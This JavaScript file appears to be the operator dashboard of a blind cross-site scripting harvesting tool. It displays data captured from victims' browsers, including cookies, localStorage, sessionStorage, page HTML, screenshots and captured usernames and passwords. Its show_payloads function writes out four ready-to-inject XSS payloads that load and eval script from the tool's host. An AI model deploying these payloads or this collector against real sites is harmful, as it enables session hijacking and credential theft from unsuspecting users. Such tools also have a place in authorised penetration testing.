function shitty_encode(s){
	return s ? s.replace(/</g,"&lt;").replace(/"/g,"&quot;") : "-";
}
 
var fields = {
	id: { name: 'ID' },
	time: { 
		name: 'Time (GMT)',
		special: function(trigger){
			var d = new Date(Date.parse(trigger.time));
			return d.toISOString().replace('T','<br>').split('.')[0];
		}
	},
	extra: { name: 'Extra' },
	url: { name: 'URL' },
	ip: { name: 'IP' },
	info: { 
		name: 'More info',
		special: function(trigger){			
			if (trigger.username || trigger.password){
				return '<b>Username:</b> ' + shitty_encode(trigger.username) + '<br>' + 
				'<b>Password:</b> ' + shitty_encode(trigger.password);
			}
			else {
				var html = '<h5>' + shitty_encode(trigger.url) + ' [' + shitty_encode(trigger.time) + ']</h5>' +
				'<div style="font-size: 11pt;text-align: left;padding: 0 15%;">' +
				'<h6>Extra</h6><p>' + shitty_encode(trigger.extra) + '</p>' +
				'<h6>Cookies</h6><p>' + shitty_encode(trigger.cookies) + '</p>' +
				'<h6>IP</h6><p>' + shitty_encode(trigger.ip) + '</p>' +
				'<h6>User-Agent</h6><p>' + shitty_encode(trigger.useragent) + '</p>' +
				'<h6>localStorage</h6><p>' + shitty_encode(trigger.localStorage) + '</p>' +
				'<h6>sessionStorage</h6><p>' + shitty_encode(trigger.sessionStorage) + '</p>' +
				'</div>' +
				'<div style="max-height:500px; overflow:auto"><a href="' + shitty_encode(trigger.canvas) + '" target="_blank"><img class="img-fluid" src="' + shitty_encode(trigger.canvas) + '"></a></div>' +
				'<textarea style="min-height:150px;font-size:11px" class="form-control" readonly>' + shitty_encode(trigger.html) + '</textarea>';

				return $('<button class="btn btn-sm btn-primary">View</button>').click(function(){
					Swal.fire({ width:'85%', html:html });
				});
			}
		}
	},
	delete: {
		name: 'Delete',
		special: function(trigger){
			return $('<button class="btn btn-sm btn-danger">Delete</button>').click(function(){
				Swal.fire({
					title: 'Are you sure?',
					html: "Deleting element with ID: <b>" + trigger.id + "</b>",
					type: 'warning',
					showCancelButton: true,
					confirmButtonColor: '#3085d6',
					cancelButtonColor: '#d33',
					confirmButtonText: 'Yes, delete it!'
				}).then((result) => {
					if (result.value) {
						$.ajax({
							url: '/triggers/' + trigger.id,
							type: 'DELETE',
							success: function(result) {
								Swal.fire(
								'Deleted!',
								'Element has been deleted.',
								'success'
								).then((result) => {
									window.location.reload();
								});
							}
						});						
					}
				});
			});
		}
	}
};

$(function(){
	var $table = $('#triggers');
	
	$.get('/triggers', function(triggers){
		var $tbody = $('<tbody style="text-align:center"></tbody>');
		$.each(triggers, function(_, trigger){
			var $row = $('<tr></tr>');
			$.each(fields, function(key, field) {
				var $td = $('<td style="vertical-align:middle"></td>');
				if('special' in field) $td.html(field.special(trigger));
				else $td.text(trigger[key]);
				$row.append($td);
			});
			$tbody.append($row);
		});
		$('#loading-div').addClass('invisible');
		$table.append($tbody);
	});

	var $rowhead = $('<tr></tr>');
	$.each(fields, function(_, field) {
		$rowhead.append('<th>' + field.name + '</th>');
	});
	$table.prepend($('<thead style="text-align:center"></thead>').append($rowhead));
});

function show_payloads(){
	var domain = document.location.host;
	var payloads = [
		'"><script src="https://' + domain + '"></script>',
		'<script>$.getScript("//' + domain + '")</script>',
		'<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//' + domain + '");a.send();</script>',
		'"><base href="//' + domain + '"><script src="./"></script>'
	];
	var div = $('<div>');
	for (var i = 0; i < payloads.length; ++i) div.append($('<input class="form-control" readonly>').val(payloads[i])).append('<br>');
	Swal.fire({
		title: 'Payloads',
		html: div
	});
}
